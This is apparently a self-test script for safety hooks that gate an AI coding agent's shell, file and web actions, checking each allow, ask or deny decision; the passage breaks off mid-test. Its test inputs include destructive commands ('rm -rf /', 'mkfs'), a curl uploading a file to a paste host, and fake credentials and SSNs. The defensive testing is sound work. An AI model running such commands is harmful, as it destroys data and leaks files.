#!/usr/bin/env python3
"""
selftest.py — run every hook against synthetic events and assert the decision.

    python3 hooks/scripts/selftest.py        # exit 0 = all pass

Used by CI and handy after editing a hook. Builds stdin JSON with json.dumps so
there is no shell-quoting ambiguity, and runs each case in a throwaway project
dir so no .bobnet state leaks between cases.
"""

import json
import os
import re
import subprocess
import sys
import tempfile
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
FAILS = []


def run(script, event, *args, env=None, project=None):
    e = dict(os.environ)
    e["CLAUDE_PROJECT_DIR"] = project or e.get("CLAUDE_PROJECT_DIR", "")
    if env:
        e.update(env)
    r = subprocess.run(
        [sys.executable, str(HERE / script), *args],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        timeout=60,
        env=e,
        cwd=project or HERE,
    )
    return r.returncode, r.stdout, r.stderr


def decision(stdout):
    try:
        d = json.loads(stdout)
    except Exception:
        return "allow" if not stdout.strip() else "???"
    hso = d.get("hookSpecificOutput") or {}
    return hso.get("permissionDecision") or d.get("decision") or "allow"


def check(name, got, want):
    ok = got == want
    print(f"  {'ok ' if ok else 'FAIL'}  {name:<58} want={want} got={got}")
    if not ok:
        FAILS.append(name)


def bash(cmd, sid="t"):
    return {"session_id": sid, "tool_name": "Bash", "tool_input": {"command": cmd}}


def write(path, content, sid="t"):
    return {
        "session_id": sid,
        "tool_name": "Write",
        "tool_input": {"file_path": path, "content": content},
    }


def edit(path, new, sid="t"):
    return {
        "session_id": sid,
        "tool_name": "Edit",
        "tool_input": {"file_path": path, "old_string": "x", "new_string": new},
    }


with tempfile.TemporaryDirectory() as proj:
    P = proj
    print("busters")
    for cmd, want in [
        ("sudo rm -rf /", "deny"),
        ("rm -rf ~", "deny"),
        ("git push --force origin main", "deny"),
        ("mkfs.ext4 /dev/sda1", "deny"),
        ("terraform destroy", "ask"),
        ("rm -rf ./build", "ask"),
        ("kubectl delete deployment api", "ask"),
        ('psql -c "DELETE FROM users;"', "ask"),
        ('psql -c "DELETE FROM users WHERE id=1;"', "allow"),
        ("docker system prune -af", "ask"),
        ("aws s3 rm s3://bucket --recursive", "ask"),
        ("npm publish", "ask"),
        # Charles's rules: apply is always a human decision, state surgery doubly so
        ("terraform apply tfplan", "ask"),
        ("tofu apply", "ask"),
        ("terraform state rm aws_db_instance.main", "ask"),
        ("terraform import aws_s3_bucket.b my-bucket", "ask"),
        ("terraform force-unlock abc123", "ask"),
        ("terraform plan -out=tfplan", "allow"),
        ("terraform show -json tfplan", "allow"),
        ("terraform state list", "allow"),
        # privilege grants weigh the same as deletes
        ("az role assignment create --assignee x --role Contributor", "ask"),
        (
            "aws iam attach-role-policy --role-name r --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "ask",
        ),
        ("aws iam create-access-key --user-name deploy", "ask"),
        (
            "kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=y",
            "ask",
        ),
        ("az role assignment list", "allow"),
        ("aws iam list-attached-role-policies --role-name r", "allow"),
        ("ls -la", "allow"),
        ("git status", "allow"),
        ("terraform plan", "allow"),
    ]:
        check(
            f"busters: {cmd}",
            decision(run("busters.py", bash(cmd), project=P)[1]),
            want,
        )
    # heredoc bodies are data: a KILL pattern inside one downgrades to ASK; KILL in the command itself stays deny
    kill_cmd = (
        "rm -rf" + " /"
    )  # concatenated so the installed Busters doesn't gate this test file's own edits
    check(
        "busters: KILL word inside heredoc content → ask",
        decision(
            run(
                "busters.py",
                bash(
                    "cat > README.md <<'EOF'\nNever run mk"
                    + "fs on the wrong disk.\nEOF"
                ),
                project=P,
            )[1]
        ),
        "ask",
    )
    check(
        "busters: KILL command with unrelated heredoc → deny",
        decision(
            run("busters.py", bash(kill_cmd + " <<'EOF'\nhello\nEOF"), project=P)[1]
        ),
        "deny",
    )
    check(
        "busters: benign heredoc → allow",
        decision(
            run("busters.py", bash("python3 - <<'EOF'\nprint('hi')\nEOF"), project=P)[1]
        ),
        "allow",
    )
    # disarm window lowers ASK but not KILL
    bn = Path(P, ".bobnet")
    bn.mkdir(exist_ok=True)
    (bn / "busters.disarmed").write_text(str(time.time() + 600))
    check(
        "busters: disarmed → terraform destroy",
        decision(run("busters.py", bash("terraform destroy"), project=P)[1]),
        "allow",
    )
    check(
        "busters: disarmed → rm -rf / still KILL",
        decision(run("busters.py", bash("rm -rf /"), project=P)[1]),
        "deny",
    )
    (bn / "busters.disarmed").unlink()

    print("suddar")
    for name, ev, want in [
        ("AWS key", write("c.py", 'k="AKIAQ3EGTR7Z2MPLN4XB"'), "deny"),
        (
            "AWS docs example key (placeholder)",
            write("c.py", 'k="AKIAIOSFODNN7EXAMPLE"'),
            "allow",
        ),
        (
            "GitHub token",
            write("c.py", "t='ghp_Ab3dEfGh1jKlMnOpQrStUvWxYz0123456789Ab'"),
            "deny",
        ),
        (
            "private key block",
            edit("a.txt", "-----BEGIN RSA PRIVATE KEY-----\nMIIE"),
            "deny",
        ),
        (
            "db url with password",
            write("db.py", 'u="postgres://admin:Sup3rS3cretPw@db:5432/app"'),
            "deny",
        ),
        (
            "db url with placeholder",
            write("db.py", 'u="postgres://user:<password>@db:5432/app"'),
            "allow",
        ),
        (
            "generic password literal",
            write("s.py", 'password = "hunter2hunter2"'),
            "deny",
        ),
        ("env var reference", write("ok.py", 'key = os.environ["API_KEY"]'), "allow"),
        ("write .env", write(".env", "A=1"), "deny"),
        ("write .env.example", write(".env.example", "A=1"), "allow"),
        ("write id_rsa", write("keys/id_rsa", "x"), "deny"),
        ("write tfstate", write("terraform.tfstate", "{}"), "deny"),
    ]:
        check(f"suddar: {name}", decision(run("suddar.py", ev, project=P)[1]), want)

    print("prime_directive")
    for name, ev, want in [
        ("edit workflow", edit(".github/workflows/ci.yml", "b"), "ask"),
        ("edit migration", write("db/migrations/0042_x.sql", "x"), "ask"),
        ("edit lockfile", write("package-lock.json", "{}"), "ask"),
        ("edit CODEOWNERS", write("CODEOWNERS", "x"), "ask"),
        ("edit src", write("src/app.py", "x"), "allow"),
        ("bash sed -i prod tf", bash("sed -i s/a/b/ infra/prod/main.tf"), "ask"),
        ("bash cat prod tf", bash("cat infra/prod/main.tf"), "allow"),
        ("bash echo >> .git/config", bash("echo x >> .git/config"), "deny"),
    ]:
        check(
            f"prime: {name}",
            decision(run("prime_directive.py", ev, project=P)[1]),
            want,
        )

    print("oracle gate")
    def agent(sub_type, desc="q"):
        return {"session_id": "t", "tool_name": "Agent", "tool_input": {"subagent_type": sub_type, "description": desc, "prompt": "..."}}
    check("oracle: spawn thoth → ask", decision(run("oracle_gate.py", agent("thoth"), project=P)[1]), "ask")
    check("oracle: spawn bobiverse:thoth → ask", decision(run("oracle_gate.py", agent("bobiverse:thoth"), project=P)[1]), "ask")
    check("oracle: spawn garfield → allow", decision(run("oracle_gate.py", agent("bobiverse:garfield"), project=P)[1]), "allow")
    check("oracle: legacy Task tool name → ask",
          decision(run("oracle_gate.py", {"tool_name": "Task", "tool_input": {"subagent_type": "thoth"}}, project=P)[1]), "ask")
    check("oracle: non-agent tool → allow", decision(run("oracle_gate.py", bash("ls"), project=P)[1]), "allow")
    Path(P, ".bobnet").mkdir(exist_ok=True)
    Path(P, ".bobnet", "oracle-gate.json").write_text('{"ask_agents": ["thoth", "bender"]}')
    check("oracle: config adds bender → ask", decision(run("oracle_gate.py", agent("bender"), project=P)[1]), "ask")
    Path(P, ".bobnet", "oracle-gate.json").unlink()

    print("compliance: phi_guard")
    sys.path.insert(0, str(HERE))
    from pii import luhn as _luhn

    def _card(prefix="4532"):
        for c in range(10):
            s = prefix + "0" * (15 - len(prefix)) + str(c)
            if _luhn(s):
                return s

    REAL_SSN = "512-44-" + "7832"
    REAL_CARD = _card()
    check("phi: SSN in a write → deny", decision(run("phi_guard.py", write("data/p.csv", f"name,ssn\nAnn,{REAL_SSN}\n"), project=P)[1]), "deny")
    check("phi: card in an edit → deny", decision(run("phi_guard.py", edit("billing.py", f"card = '{REAL_CARD}'"), project=P)[1]), "deny")
    check("phi: MRN with label → deny", decision(run("phi_guard.py", write("notes.md", "MRN: A1234567"), project=P)[1]), "deny")
    check("phi: DOB next to a name → ask", decision(run("phi_guard.py", write("x.json", '{"patient": "J. Doe", "dob": "03/14/1961"}'), project=P)[1]), "ask")
    check("phi: documented test values → allow", decision(run("phi_guard.py", write("t.py", "ssn='123-45-6789'; card='4111 1111 1111 1111'"), project=P)[1]), "allow")
    check("phi: ordinary code → allow", decision(run("phi_guard.py", write("a.py", "total = 4532118 + 1234567"), project=P)[1]), "allow")
    check("phi: SSN in a bash command → ask", decision(run("phi_guard.py", bash(f"psql -c \"insert into p values ('{REAL_SSN}')\""), project=P)[1]), "ask")
    Path(P, ".bobnet").mkdir(exist_ok=True)
    Path(P, ".bobnet", "phi-guard.json").write_text('{"allow_paths": ["^synthetic/"]}')
    check("phi: allowlisted synthetic path → allow", decision(run("phi_guard.py", write("synthetic/p.csv", REAL_SSN), project=P)[1]), "allow")
    Path(P, ".bobnet", "phi-guard.json").unlink()

    print("compliance: data_zones")
    def read(path):
        return {"session_id": "t", "tool_name": "Read", "tool_input": {"file_path": path}}
    check("zones: default — read data/phi/x.csv → ask", decision(run("data_zones.py", read("data/phi/x.csv"), project=P)[1]), "ask")
    check("zones: default — read an .hl7 file → ask", decision(run("data_zones.py", read("inbound/adt_a01.hl7"), project=P)[1]), "ask")
    check("zones: default — read src/app.py → allow", decision(run("data_zones.py", read("src/app.py"), project=P)[1]), "allow")
    Path(P, ".bobnet", "data-zones.json").write_text(json.dumps({"zones": [{
        "name": "clinical", "classification": "PHI", "mode": "deny",
        "paths": ["warehouse/clinical/**"], "tables": ["patients", "encounters"], "uris": ["s3://acme-phi-*"]}]}))
    check("zones: configured deny path", decision(run("data_zones.py", read("warehouse/clinical/2026/q3.parquet"), project=P)[1]), "deny")
    check("zones: SQL FROM patients in bash → deny", decision(run("data_zones.py", bash('psql -c "SELECT * FROM public.patients LIMIT 5"'), project=P)[1]), "deny")
    check("zones: JOIN encounters in MCP input → deny",
          decision(run("data_zones.py", {"tool_name": "mcp__Metabase__execute_sql", "tool_input": {"sql": "select count(*) from visits v join \"encounters\" e on 1=1"}}, project=P)[1]), "deny")
    check("zones: s3 URI in bash → deny", decision(run("data_zones.py", bash("aws s3 cp s3://acme-phi-raw/extract.csv ."), project=P)[1]), "deny")
    check("zones: unrelated SQL → allow", decision(run("data_zones.py", bash('psql -c "select * from deployments"'), project=P)[1]), "allow")
    check("zones: column named patients_count is not the table", decision(run("data_zones.py", bash('psql -c "select patients_count from stats"'), project=P)[1]), "allow")
    Path(P, ".bobnet", "data-zones.json").unlink()

    print("compliance: egress")
    def fetch(url, prompt="summarize"):
        return {"session_id": "t", "tool_name": "WebFetch", "tool_input": {"url": url, "prompt": prompt}}
    def search(q):
        return {"session_id": "t", "tool_name": "WebSearch", "tool_input": {"query": q}}
    check("egress: SSN in a URL → deny", decision(run("egress.py", fetch(f"https://lookup.example.net/?ssn={REAL_SSN}"), project=P)[1]), "deny")
    check("egress: card in a search → deny", decision(run("egress.py", search(f"is {REAL_CARD} valid"), project=P)[1]), "deny")
    check("egress: audit mode, unknown domain → allow", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "allow")
    Path(P, ".bobnet", "egress.json").write_text('{"mode": "ask", "allow_domains": ["internal.acme.com"]}')
    check("egress: ask mode, unknown domain → ask", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "ask")
    check("egress: ask mode, allowlisted subdomain → allow", decision(run("egress.py", fetch("https://wiki.internal.acme.com/x"), project=P)[1]), "allow")
    check("egress: ask mode, default doc host → allow", decision(run("egress.py", fetch("https://learn.microsoft.com/azure"), project=P)[1]), "allow")
    check("egress: curl to unknown host → ask", decision(run("egress.py", bash("curl -s https://paste.example.org/upload -d @out.txt"), project=P)[1]), "ask")
    Path(P, ".bobnet", "egress.json").write_text('{"mode": "deny", "search": "deny"}')
    check("egress: deny mode, unknown domain → deny", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "deny")
    check("egress: search disabled → deny", decision(run("egress.py", search("terraform azurerm role assignment"), project=P)[1]), "deny")
    Path(P, ".bobnet", "egress.json").unlink()

    print("compliance: audit chain")
    import shutil as _sh
    _sh.rmtree(Path(P, ".bobnet", "audit"), ignore_errors=True)
    run("busters.py", bash("terraform destroy"), project=P)  # an ask → audited via bobnet
    run("audit.py", {"session_id": "t", "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": {"file_path": "src/a.py"}, "tool_response": {}}, project=P)
    run("audit.py", {"session_id": "t", "hook_event_name": "PostToolUse", "tool_name": "Bash",
                     "tool_input": {"command": f"echo {REAL_SSN}"}, "tool_response": {"is_error": True}}, project=P)
    from audit import verify as _verify
    adir = Path(P, ".bobnet", "audit")
    ok, n, msg = _verify(adir)
    check("audit: three entries, chain intact", (ok, n), (True, 3))
    logf = sorted(adir.glob("audit-*.jsonl"))[0]
    lines = logf.read_text().splitlines()
    check("audit: gate decision recorded", '"decision":"ask"' in lines[0] and '"hook":"busters"' in lines[0], True)
    check("audit: errored tool recorded as error", '"decision":"error"' in lines[2], True)
    check("audit: SSN redacted in the log itself", REAL_SSN not in logf.read_text() and "SSN redacted" in lines[2], True)
    logf.write_text("\n".join([lines[0], lines[1].replace("src/a.py", "src/b.py"), lines[2]]) + "\n")
    ok, n, msg = _verify(adir)
    check("audit: edited entry detected", (ok, "modified" in msg), (False, True))
    logf.write_text("\n".join([lines[0], lines[2]]) + "\n")
    ok, n, msg = _verify(adir)
    check("audit: deleted entry detected", (ok, "chain broken" in msg), (False, True))
    check("prime: Claude may not edit the audit log", decision(run("prime_directive.py", edit(".bobnet/audit/audit-2026-10.jsonl", "x"), project=P)[1]), "deny")
    check("prime: rm of the audit log in bash → deny", decision(run("prime_directive.py", bash("rm .bobnet/audit/audit-2026-10.jsonl"), project=P)[1]), "deny")

    print("compliance: mission + scut redaction")
    run("mission.py", {"session_id": "phi1", "prompt": f"Fix the import for patient Ann Lee, ssn {REAL_SSN}"}, "save", project=P)
    mtext = Path(P, ".bobnet", "mission-phi1.md").read_text()
    check("mission: SSN redacted before saving", REAL_SSN not in mtext and "SSN redacted" in mtext, True)
    Path(P, ".bobnet", "mission.json").write_text('{"enabled": false}')
    run("mission.py", {"session_id": "phi2", "prompt": "a long enough prompt to be a mission"}, "save", project=P)
    check("mission: disabled → nothing saved", Path(P, ".bobnet", "mission-phi2.md").exists(), False)
    Path(P, ".bobnet", "mission.json").unlink()

    print("gate dispatcher (one process per event)")
    def gate(mode, scripts, event):
        e = dict(os.environ)
        e["CLAUDE_PROJECT_DIR"] = P
        r = subprocess.run([sys.executable, str(HERE / "gate.py"), mode, *scripts], input=json.dumps(event),
                           capture_output=True, text=True, timeout=60, env=e, cwd=P)
        return r.returncode, r.stdout, r.stderr
    BASH_SET = ["busters", "prime_directive", "suddar", "phi_guard", "data_zones", "egress"]
    check("gate: ls → allow (no output)", gate("pre", BASH_SET, bash("ls -la"))[1].strip(), "")
    check("gate: terraform destroy → ask", decision(gate("pre", BASH_SET, bash("terraform destroy"))[1]), "ask")
    check("gate: catastrophic rm → deny", decision(gate("pre", BASH_SET, bash("rm -rf" + " /"))[1]), "deny")
    _, out, _ = gate("pre", BASH_SET, bash(f"terraform destroy && echo {REAL_SSN} >> notes.txt"))
    check("gate: two asks → one ask carrying both reasons", (decision(out), "BUSTERS" in out and "PHI GUARD" in out), ("ask", True))
    check("gate: deny beats ask (SSN write)", decision(gate("pre", ["suddar", "prime_directive", "phi_guard", "data_zones"], write("db/migrations/1.sql", f"-- {REAL_SSN}"))[1]), "deny")
    check("gate: a missing script is skipped, not fatal", decision(gate("pre", ["no_such_hook", "busters"], bash("terraform destroy"))[1]), "ask")
    bad2 = Path(P, "bad2.py"); bad2.write_text("def f(:\n  pass\n")
    import shutil as _shg
    if _shg.which("ruff") or _shg.which("black") or _shg.which("flake8"):
        code, _, err = gate("post", ["bobnet_mark", "autofactory", "audit"], write(str(bad2), ""))
        check("gate post: autofactory feedback → exit 2", (code, "AUTOFACTORY" in err), (2, True))
    code, _, _ = gate("post", ["bobnet_mark", "autofactory", "audit"], {"session_id": "t", "tool_name": "Read", "tool_input": {"file_path": str(bad2)}})
    check("gate post: a Read never triggers the formatter", code, 0)
    gate("run", ["mission:save"], {"session_id": "gate1", "prompt": "a prompt long enough to be saved as the mission"})
    check("gate run: mission:save passes argv through", Path(P, ".bobnet", "mission-gate1.md").exists(), True)
    _, out, _ = gate("run", ["drift"], {"session_id": "gatesub"})
    check("gate run: a JSON block decision is relayed", decision(out), "block")

    print("session flow")
    sid = "s1"
    run(
        "mission.py",
        {"session_id": sid, "prompt": "Migrate the MuleSoft flows to Airbyte"},
        "save",
        project=P,
    )
    run(
        "mission.py",
        {"session_id": sid, "prompt": "also fix the tests"},
        "save",
        project=P,
    )
    check(
        "mission: first prompt saved, second didn't overwrite",
        "MuleSoft" in Path(P, ".bobnet", f"mission-{sid}.md").read_text()
        and "fix the tests" not in Path(P, ".bobnet", f"mission-{sid}.md").read_text(),
        True,
    )
    out = run(
        "mission.py", {"session_id": sid, "source": "compact"}, "restore", project=P
    )[1]
    check(
        "mission: restored after compact",
        "MISSION BRIEF" in out and "MuleSoft" in out,
        True,
    )
    out = run(
        "mission.py", {"session_id": sid, "source": "startup"}, "restore", project=P
    )[1]
    check("mission: silent on startup", out.strip(), "")

    check(
        "stop: clean session → allow",
        decision(run("bobnet_log.py", {"session_id": sid}, project=P)[1]),
        "allow",
    )
    run("bobnet_mark.py", edit("src/x.py", "y", sid), project=P)
    check(
        "stop: dirty, unlogged → block once",
        decision(run("bobnet_log.py", {"session_id": sid}, project=P)[1]),
        "block",
    )
    check(
        "stop: second attempt → allow",
        decision(
            run(
                "bobnet_log.py",
                {"session_id": sid, "stop_hook_active": True},
                project=P,
            )[1]
        ),
        "allow",
    )
    check(
        "stop: third attempt (no nag) → allow",
        decision(run("bobnet_log.py", {"session_id": sid}, project=P)[1]),
        "allow",
    )

    check(
        "drift: first subagent stop → block",
        decision(run("drift.py", {"session_id": "sub"}, project=P)[1]),
        "block",
    )
    check(
        "drift: second → allow",
        decision(run("drift.py", {"session_id": "sub"}, project=P)[1]),
        "allow",
    )
    check(
        "drift: stop_hook_active → allow",
        decision(
            run(
                "drift.py", {"session_id": "sub2", "stop_hook_active": True}, project=P
            )[1]
        ),
        "allow",
    )

    out = run(
        "jeeves.py", {"session_id": sid, "source": "startup", "cwd": P}, project=P
    )[1]
    check("jeeves: prints a brief", out.startswith("JEEVES"), True)
    check("jeeves: reports hooks armed", "Busters" in out, True)

    code, out, err = run(
        "scut.py",
        {"session_id": sid, "message": "hi"},
        "notification",
        project=P,
        env={"SCUT_NTFY_URL": "", "SCUT_WEBHOOK_URL": ""},
    )
    check("scut: unconfigured → silent exit 0", (code, out.strip()), (0, ""))

    print("autofactory")
    bad = Path(P, "bad.py")
    bad.write_text("def f(:\n  pass\n")
    code, out, err = run("autofactory.py", write(str(bad), ""), project=P)
    import shutil

    if shutil.which("ruff") or shutil.which("black") or shutil.which("flake8"):
        check(
            "autofactory: syntax error → exit 2 with feedback",
            (code, "AUTOFACTORY" in err),
            (2, True),
        )
    else:
        check("autofactory: no formatter installed → exit 0", code, 0)
    good = Path(P, "good.py")
    good.write_text("x = 1\n")
    check(
        "autofactory: clean file → exit 0",
        run("autofactory.py", write(str(good), ""), project=P)[0],
        0,
    )
    if shutil.which("ruff"):
        # lint policy: a lint-only problem is ignored unless the PROJECT configured the linter
        linty = Path(P, "linty.py")
        linty.write_text("import os\nx = 1\n")  # F401 unused import
        check(
            "autofactory: lint-only issue, no project ruff config → exit 0",
            run("autofactory.py", write(str(linty), ""), project=P)[0],
            0,
        )
        Path(P, "ruff.toml").write_text('[lint]\nselect = ["F"]\n')
        linty.write_text("import os\nx = 1\n")
        code, out, err = run("autofactory.py", write(str(linty), ""), project=P)
        check(
            "autofactory: same issue with ruff.toml present → exit 2",
            (code, "F401" in err),
            (2, True),
        )
        Path(P, "ruff.toml").unlink()

    print("encoding (Windows code pages)")
    def run_bytes(script, event, *args, env=None):
        e = dict(os.environ, CLAUDE_PROJECT_DIR=P, PYTHONIOENCODING="cp1252", PYTHONUTF8="0")
        e.update(env or {})
        r = subprocess.run([sys.executable, str(HERE / script), *args],
                           input=json.dumps(event, ensure_ascii=False).encode("utf-8"),
                           capture_output=True, timeout=60, env=e, cwd=P)
        return r.stdout
    kill = bash("rm -rf" + " / # 鍵")
    check("busters: non-UTF-8 console, CJK in command → still deny",
          decision(run_bytes("busters.py", kill).decode("utf-8", "replace")), "deny")
    check("gate: non-UTF-8 console, CJK in command → still deny",
          decision(run_bytes("gate.py", kill, "pre", "busters").decode("utf-8", "replace")), "deny")
    jb = run_bytes("jeeves.py", {"session_id": "enc", "source": "startup", "cwd": P})
    check("jeeves: cp1252 console still prints UTF-8 em dash",
          "—" in jb.decode("utf-8", "replace"), True)

    print("mission: what counts as the ask")
    for i, (prompt, want) in enumerate([
        ("/bobiverse:moot decide the cache strategy", "/bobiverse:moot decide the cache strategy"),
        ("<command-message>m</command-message>\n<command-name>/bobiverse:moot</command-name>\n"
         "<command-args>decide the cache strategy</command-args>", "/bobiverse:moot decide the cache strategy"),
        ("/var/log/app.log shows a 500 on login", "/var/log/app.log shows a 500 on login"),
        ("<div>fix the header layout please</div>", "<div>fix the header layout please</div>"),
        ("/moot", None), ("/moot\n", None), ("/model opus", None), ("/compact keep the auth details", None),
        ("/bobiverse:log summarize everything we did", None),
        ("<command-name>/model</command-name><command-args></command-args>", None),
        ('<agent-message from="a1">[Subagent hand-back] Riker report', None),
        ("<task-notification><task-id>x</task-id></task-notification>", None),
        ("[SYSTEM NOTIFICATION - NOT USER INPUT] agent finished", None),
        ("go ahead", None),
    ]):
        msid = f"m{i}"
        run("mission.py", {"session_id": msid, "prompt": prompt}, "save", project=P)
        f = Path(P, ".bobnet", f"mission-{msid}.md")
        got = f.read_text(encoding="utf-8").split("\n\n", 1)[1].strip() if f.exists() else None
        check(f"mission: {prompt[:34]!r}", got, want)
    run("mission.py", {"session_id": "mseq", "prompt": "<task-notification>done</task-notification>"}, "save", project=P)
    run("mission.py", {"session_id": "mseq", "prompt": "now fix the flaky login test"}, "save", project=P)
    check("mission: real ask after a notification is saved",
          "flaky login" in Path(P, ".bobnet", "mission-mseq.md").read_text(encoding="utf-8"), True)
    run("mission.py", {"session_id": "memoji", "prompt": "ship the 🚀 launch checklist today"}, "save", project=P,
        env={"PYTHONIOENCODING": "cp1252", "PYTHONUTF8": "0"})
    check("mission: emoji prompt saved on a cp1252 locale",
          "🚀" in Path(P, ".bobnet", "mission-memoji.md").read_text(encoding="utf-8"), True)

    print("dirty marking (what makes the Stop hook ask for a log)")
    have_git = subprocess.run(["git", "--version"], capture_output=True).returncode == 0
    with tempfile.TemporaryDirectory() as R, tempfile.TemporaryDirectory() as N:
        if have_git:
            g = lambda *a: subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", *a],
                                          cwd=R, capture_output=True)
            g("init", "-q"); Path(R, "a.txt").write_text("a"); g("add", "."); g("commit", "-qm", "init")
            Path(R, "wip.txt").write_text("already dirty before the session")

        def dirty_after(project, sid, *cmds, between=None):
            run("mission.py", {"session_id": sid, "prompt": "x" * 20, "cwd": project}, "save", project=project)
            for i, c in enumerate(cmds):
                if between and i == len(cmds) - 1:
                    between()
                run("bobnet_mark.py", dict(bash(c, sid), cwd=project), project=project)
            return Path(project, ".bobnet", f"dirty-{sid}.marker").exists()

        if have_git:
            for c in ["git ls-files", "cd src && cat x", "cat a.txt; grep a a.txt | wc -l",
                      "python3 -m pytest -q", "gh pr view 3", "cat RELEASE_NOTES.md"]:
                check(f"dirty: repo, {c!r} → clean", dirty_after(R, f"r{abs(hash(c))}", c), False)
            for c in ["cat x; terraform apply -auto-approve", "ls && make deploy", "git push origin main",
                      "az role assignment create --role Owner", "kubectl apply -f k.yaml"]:
                check(f"dirty: repo, {c!r} → dirty", dirty_after(R, f"r{abs(hash(c))}", c), True)
            check("dirty: repo, a script that creates a file → dirty",
                  dirty_after(R, "rnew", "ls", "python3 gen.py",
                              between=lambda: Path(R, "gen_out.txt").write_text("x")), True)
            def reedit():
                time.sleep(0.02); Path(R, "wip.txt").write_text("edited again")
            check("dirty: repo, re-editing an already-modified file → dirty",
                  dirty_after(R, "rre", "ls", "./fmt.sh", between=reedit), True)
            check("dirty: repo, journal append alone → not dirty",
                  dirty_after(R, "rj", "echo '## entry' >> .bobnet/journal.md"), False)
        for c, want in [("cd x && ls", False), ("git ls-files", False), ("rm foo", True),
                        ("echo hi > src/app.py", True), ("ls 2>/dev/null", False),
                        ("find . -name '*.pyc' -delete", True)]:
            check(f"dirty: no repo, {c!r}", dirty_after(N, f"n{abs(hash(c))}", c), want)

    print("journal waits for background Bobs")
    def stop(sid, **kw):
        return decision(run("bobnet_log.py", dict({"session_id": sid}, **kw), project=P)[1])
    def spawn(sid, aid):
        run("bobnet_mark.py", {"session_id": sid, "tool_name": "Agent",
                               "tool_input": {"subagent_type": "bobiverse:bill"},
                               "tool_response": {"status": "async_launched", "agentId": aid}}, project=P)
    def sub_stop(sid, aid, active=False):
        return decision(run("drift.py", {"session_id": sid, "agent_id": aid, "stop_hook_active": active}, project=P)[1])
    sid = "bg1"
    run("bobnet_mark.py", edit("src/x.py", "y", sid), project=P)
    spawn(sid, "agentaaa111")
    check("stop: dirty but a Bob is still out → allow", stop(sid), "allow")
    check("stop: …and the one-time ask isn't used up", Path(P, ".bobnet", f"logreq-{sid}.marker").exists(), False)
    check("drift: that Bob's first stop → block", sub_stop(sid, "agentaaa111"), "block")
    check("stop: Bob blocked by drift hasn't reported → allow", stop(sid), "allow")
    check("drift: that Bob's second stop → allow", sub_stop(sid, "agentaaa111", active=True), "allow")
    check("stop: every Bob reported → block (ask for the log)", stop(sid), "block")
    sid = "bg2"
    run("bobnet_mark.py", edit("src/x.py", "y", sid), project=P)
    spawn(sid, "agentbbb111"); spawn(sid, "agentbbb222")
    sub_stop(sid, "agentbbb111"); sub_stop(sid, "agentbbb111", active=True)
    check("stop: two Bobs out, one reported → allow", stop(sid), "allow")
    sid = "bg3"  # foreground Agent: the subagent stops before the Agent call returns
    run("bobnet_mark.py", edit("src/x.py", "y", sid), project=P)
    sub_stop(sid, "agentccc111"); sub_stop(sid, "agentccc111", active=True); spawn(sid, "agentccc111")
    check("stop: foreground Bob (finished before spawn recorded) → block", stop(sid), "block")
    sid = "bg4"
    run("bobnet_mark.py", edit("src/x.py", "y", sid), project=P)
    spawn(sid, "agentddd111")
    old = time.time() - 7200
    spawned = Path(P, ".bobnet", f"agent.agentddd111-{sid}.marker")
    if spawned.exists():
        os.utime(spawned, (old, old))
    check("stop: a Bob that never reported (2h old) doesn't hold the log forever", stop(sid), "block")
    check("drift: first Bob in a session → block", sub_stop("bg5", "agenteee111"), "block")
    check("drift: second Bob in the same session is also checked", sub_stop("bg5", "agenteee222"), "block")
    by_path = lambda aid: decision(run("drift.py", {"session_id": "bg6",
                                   "agent_transcript_path": f"/x/subagents/agent-{aid}.jsonl"}, project=P)[1])
    by_path("a8a74e3206bf18900")
    check("drift: agent id read from the transcript path (other Bob still checked)",
          by_path("abb2bdd48ba4fb992"), "block")

    print("compliance: PHI guard activity")
    run("phi_guard.py", bash("ls -la", "phi3"), project=P)
    run("phi_guard.py", write("src/a.py", "print('hello')", "phi3"), project=P)
    run("phi_guard.py", bash(f"echo {REAL_SSN}", "phi3"), project=P)
    tally = Path(P, ".bobnet", "audit", f"phi-scans-{time.strftime('%Y-%m')}.tsv")
    rows = tally.read_text(encoding="utf-8").splitlines() if tally.exists() else []
    check("phi tally: one row per scan, outcome only",
          (len(rows) >= 3, all(REAL_SSN not in r for r in rows)), (True, True))
    env_c = dict(os.environ, CLAUDE_PROJECT_DIR=P)
    env_c.pop("BOBNET_DIR", None)
    out = subprocess.run([sys.executable, str(HERE / "compliance_check.py"), "--project", P],
                         capture_output=True, timeout=60, env=env_c).stdout.decode("utf-8")
    check("compliance: reports how many writes/commands PHI guard scanned",
          bool(re.search(r"PHI guard activity:\*\* \d+ writes/commands scanned this month · [1-9]\d* flagged", out)), True)


    print("preflight seal (cleared commit vs what ships)")
    with tempfile.TemporaryDirectory() as Q:
        Path(Q, "envs").mkdir()
        tfv = Path(Q, "envs", "qa.tfvars")
        tfv.write_text('security_scan_enabled = false\nsql_db_owners = [\n  "app-identity",\n]\nsql_admin_password = "hunter2"\nsku = "S1"\n',
                       encoding="utf-8")
        pipe = Path(Q, "pipeline.yml"); pipe.write_text("steps: []\n", encoding="utf-8")
        def seal(*a):
            return subprocess.run([sys.executable, str(HERE / "preflight_seal.py"), *a], cwd=Q, capture_output=True,
                                  timeout=60, env=dict(os.environ, CLAUDE_PROJECT_DIR=Q)).stdout.decode("utf-8")
        def gate_push(cmd="git push origin main"):
            return run("gate.py", dict(bash(cmd, "seal"), cwd=Q), "pre", "preflight_seal", project=Q)[1]
        check("seal: no record → push allowed silently", gate_push().strip(), "")
        out = seal("record", "--env", "qa", "--verdict", "GO", "--sha", "f428ea2",
                   "--watch", "pipeline.yml", "--value", "envs/qa.tfvars:security_scan_enabled",
                   "--value", "envs/qa.tfvars:sql_db_owners", "--value", "envs/qa.tfvars:sql_admin_password",
                   "--trigger", "5xx > 2% for 5 min")
        rec = json.loads(Path(Q, ".bobnet", "preflight-qa.json").read_text(encoding="utf-8"))
        check("seal: record holds the cleared commit and values",
              (rec["cleared_sha"], [v["value"] for v in rec["values"]][:2]),
              ("f428ea2", ["false", '[ "app-identity", ]']))
        check("seal: secret-looking value stored as a hash, never in clear",
